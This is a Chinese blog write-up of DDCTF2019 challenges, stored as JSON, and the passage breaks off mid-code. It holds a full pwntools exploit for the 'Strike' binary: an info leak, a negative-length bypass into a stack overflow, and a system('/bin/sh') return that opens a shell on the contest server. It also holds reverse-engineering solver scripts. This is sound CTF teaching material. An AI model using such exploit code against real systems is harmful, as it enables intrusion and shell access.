{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-09-21T08:33:04.441Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","photos":[],"link":"","excerpt":"本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。Pwnpwn只有一道题目Strike该题目提供了libc，防护如下：1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn <br>[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。","covers":null,"content":"<p>本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwn只有一道题目</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>该题目提供了libc，防护如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。</p>\n<p>简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：</p>\n<p>在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。</p>\n<a id=\"more\"></a>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_80485DB</span><span class=\"params\">(FILE *stream, FILE *a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+0h] [ebp-48h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter username: \"</span>);</span><br><span class=\"line\">  v2 = fileno(stream);</span><br><span class=\"line\">  read(v2, &amp;buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">fprintf</span>(a2, <span class=\"string\">\"Hello %s\"</span>, &amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调试可知，我们从ebp-0x48处开始写，而ebp-0x20处为栈地址，ebp-0x24处为libc地址，所以padding 0x48 - 0x20字节可以直接leak处栈地址和libc地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp 100</span><br><span class=\"line\">0xffffcf00│+0x0000: 0x00000000\t ← $esp</span><br><span class=\"line\">0xffffcf04│+0x0004: 0xffffcf10  →  0xf7ffd000  →  0x00023f40</span><br><span class=\"line\">0xffffcf08│+0x0008: 0x00000040 (&quot;@&quot;?)</span><br><span class=\"line\">0xffffcf0c│+0x000c: 0xffffcf88  →  0xf7e0bdc8  →  0x00002b76 (&quot;v+&quot;?)</span><br><span class=\"line\">0xffffcf10│+0x0010: 0xf7ffd000  →  0x00023f40  &lt;= 从这里开始写</span><br><span class=\"line\">0xffffcf14│+0x0014: 0x080482c8  →   add BYTE PTR [ecx+ebp*2+0x62], ch</span><br><span class=\"line\">0xffffcf18│+0x0018: 0x08048258  →  0x00000057 (&quot;W&quot;?)</span><br><span class=\"line\">0xffffcf1c│+0x001c: 0x00000000</span><br><span class=\"line\">0xffffcf20│+0x0020: 0xf7ffda74  →  0xf7fd3470  →  0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf24│+0x0024: 0xf7e0bcc8  →  0x000029d0</span><br><span class=\"line\">0xffffcf28│+0x0028: 0xf7e5f21b  →  &lt;setbuffer+11&gt; add ebx, 0x151de5</span><br><span class=\"line\">0xffffcf2c│+0x002c: 0x00000000</span><br><span class=\"line\">0xffffcf30│+0x0030: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf34│+0x0034: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf38│+0x0038: 0xffffcfc8  →  0x00000000 &lt;= main函数的ebp地址</span><br><span class=\"line\">0xffffcf3c│+0x003c: 0xf7e65005  →  &lt;setbuf+21&gt; add esp, 0x1c &lt;= libc地址</span><br><span class=\"line\">0xffffcf40│+0x0040: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf44│+0x0044: 0x00000000</span><br><span class=\"line\">0xffffcf48│+0x0048: 0x00002000</span><br><span class=\"line\">0xffffcf4c│+0x004c: 0xf7e64ff0  →  &lt;setbuf+0&gt; sub esp, 0x10</span><br><span class=\"line\">0xffffcf50│+0x0050: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf54│+0x0054: 0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf58│+0x0058: 0xffffcfc8  →  0x00000000\t ← $ebp</span><br></pre></td></tr></table></figure>\n<p>然后考虑如何劫持控制流。这里注意，虽然在检查长度时会强制转换为有符号数，但是在read函数传参时仍旧把nbytes当作无符号数，所以如果输入负数，就可以绕过长度检查，实现任意长度的栈溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbytes = read_num();</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)nbytes &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">\"Too long!\"</span>);</span><br><span class=\"line\">   <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter password(lenth %u): \"</span>, nbytes);</span><br><span class=\"line\"> v1 = fileno(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"> read(v1, &amp;buf, nbytes); &lt;= IO2BO</span><br></pre></td></tr></table></figure>\n<p>但是main函数返回的栈桢操作比较特殊，在main函数返回之前的汇编语句如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048735                 mov     eax, 0</span><br><span class=\"line\">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class=\"line\">.text:0804873D                 pop     ecx</span><br><span class=\"line\">.text:0804873E                 pop     ebx</span><br><span class=\"line\">.text:0804873F                 pop     ebp</span><br><span class=\"line\">.text:08048740                 lea     esp, [ecx-4]</span><br><span class=\"line\">.text:08048743                 retn</span><br></pre></td></tr></table></figure>\n<p>首先令esp指向ebp-8处，然后分别pop三次给ecx, ebx和ebp，最后将esp指向ecx-4处，然后retn，也就是将eip转到ecx-4处开始执行代码。所以我们需要在ebp-8处布置栈，令esp和ebp均指向我们构造的栈桢处。直接看exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p32(system) <span class=\"comment\"># [ebp - 0x4c]</span></span><br><span class=\"line\">payload += p32(main) <span class=\"comment\"># fake ebp of system [ebp - 0x4c + 4]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>) <span class=\"comment\"># arg1:the addr of /bin/sh [ebp - 0x4c + 8]</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># [ebp - 0x4c + 12]</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>) <span class=\"comment\"># padding to [ebp - 8]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># ecx = target_addr + 4</span></span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span> <span class=\"comment\"># ebx</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># fake ebp</span></span><br></pre></td></tr></table></figure>\n<p>最终完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./xpwn\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"116.85.48.105\"</span>,<span class=\"string\">\"5005\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc.so.6\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"username: \"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">10</span> * <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">stack_addr = u32(p.recvuntil(<span class=\"string\">\"\\xff\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)</span><br><span class=\"line\">leak = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = leak - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"comment\"># binsh = next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"password: \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"-1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"): \"</span>)</span><br><span class=\"line\">main = <span class=\"number\">0x804862d</span></span><br><span class=\"line\">payload = p32(system)</span><br><span class=\"line\">payload += p32(main)</span><br><span class=\"line\"><span class=\"comment\"># payload += p32(binsh)</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">All done, bye!</span><br><span class=\"line\">$ cat flag</span><br><span class=\"line\">DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"RE1\"><a href=\"#RE1\" class=\"headerlink\" title=\"RE1\"></a>RE1</h2><p>本题相当简单，是RE的签到题，就是一个字符匹配，写脚本迭代即可。直接upx脱壳。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"string\">\"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#\\\"!\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">\"DDCTF&#123;reverseME&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = <span class=\"number\">0x402ff8</span></span><br><span class=\"line\">first_addr = <span class=\"number\">0x403018</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> target:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(magic)):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> magic[i] == ch:</span><br><span class=\"line\">\t\t\tflag += chr(i + first_addr - base_addr)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<p>DDCTF{ZZ[JX#,9(9,+9QY!}</p>\n<h2 id=\"RE2\"><a href=\"#RE2\" class=\"headerlink\" title=\"RE2\"></a>RE2</h2><p>本题也不算难，只是需要比上题多一点的逆向功底，可以说上题只靠调试器就能解决了。该题首先将16进制字符串解码，然后base64编码，令编码后的结果为”reserse+”即可。这里在二进制文件中并没有base64的那个明显的字符串，但是有一个64位的字符串很可疑，最后调试发现其实就是标准的base64算法。</p>\n<p>对了，本题也加了壳，但是我记得似乎不能用upx直接脱壳，用esp定律即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = <span class=\"string\">\"reverse+\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">print</span> b64decode(target).encode(<span class=\"string\">\"hex\"</span>).upper()</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{ADEBDEAEC7BE}</p>\n<h2 id=\"Confused\"><a href=\"#Confused\" class=\"headerlink\" title=\"Confused\"></a>Confused</h2><p>本题是一道macos逆向题，这是我第一次做macOS的逆向，但其实逆向的思路都是一样的。右键点击app（当然要在osx系统下）文件，选择显示包内容，然后在/Contents/MacOS/路径下就能找到可执行文件。其实我们可以直接用IDA打开这个文件进行反汇编，然后用llgb（类似gdb）加载这个文件进行动态调试。</p>\n<p>简单看一下，发现核心逻辑就在checkCode函数中。</p>\n<p>函数首先检查flag是否以”DDCTF{“开头，然后检查最后一位是否为”}”，然后用substringWithRange函数获取花括号包裹的字符串，如果它的长度为18，则合法，且转为UTF8String。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v5; <span class=\"comment\">// ST18_8</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v11; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v12; <span class=\"comment\">// [rsp+38h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v13; <span class=\"comment\">// [rsp+40h] [rbp-50h]</span></span><br><span class=\"line\">  __int128 v14; <span class=\"comment\">// [rsp+48h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// [rsp+58h] [rbp-38h]</span></span><br><span class=\"line\">  SEL v16; <span class=\"comment\">// [rsp+60h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v17; <span class=\"comment\">// [rsp+68h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v18; <span class=\"comment\">// [rsp+70h] [rbp-20h]</span></span><br><span class=\"line\">  __int64 v19; <span class=\"comment\">// [rsp+78h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+80h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v21; <span class=\"comment\">// [rsp+88h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = self;</span><br><span class=\"line\">  v16 = a2;</span><br><span class=\"line\">  v15 = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, (__int64)a3);</span><br><span class=\"line\">  v3 = objc_msgSend(v17, <span class=\"string\">\"pwd\"</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v3);</span><br><span class=\"line\">  v5 = v4;</span><br><span class=\"line\">  v6 = objc_msgSend(v4, <span class=\"string\">\"stringValue\"</span>);</span><br><span class=\"line\">  v14 = (<span class=\"keyword\">unsigned</span> __int64)objc_retainAutoreleasedReturnValue((__int64)v6);</span><br><span class=\"line\">  objc_release(v5);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"hasPrefix:\"</span>, CFSTR(<span class=\"string\">\"DDCTF&#123;\"</span>)) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">    v8 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringFromIndex:\"</span>, v7 - <span class=\"number\">1</span>);</span><br><span class=\"line\">    v13 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v8);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend(v13, <span class=\"string\">\"isEqualToString:\"</span>, CFSTR(<span class=\"string\">\"&#125;\"</span>)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v9 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">      v19 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v18 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v20 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v21 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v10 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringWithRange:\"</span>, <span class=\"number\">6L</span>L, v9 - <span class=\"number\">7</span>);</span><br><span class=\"line\">      v12 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v10);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( objc_msgSend(v12, <span class=\"string\">\"length\"</span>) == (<span class=\"keyword\">void</span> *)<span class=\"number\">18</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v11 = (<span class=\"keyword\">void</span> *)objc_retainAutorelease(v12);</span><br><span class=\"line\">        *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) = objc_msgSend(v11, <span class=\"string\">\"UTF8String\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      objc_storeStrong((__int64)&amp;v12, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    objc_storeStrong((__int64)&amp;v13, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_1000011D0(*((__int64 *)&amp;v14 + <span class=\"number\">1</span>)) == <span class=\"number\">1</span> )</span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onSuccess\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v14, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在sub_100001f60中，对一个结构体进行了初始化，填充了一些常量和函数指针，这个结构体是该题的核心。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F60</span><span class=\"params\">(__int64 result, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_DWORD *)result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">4</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result 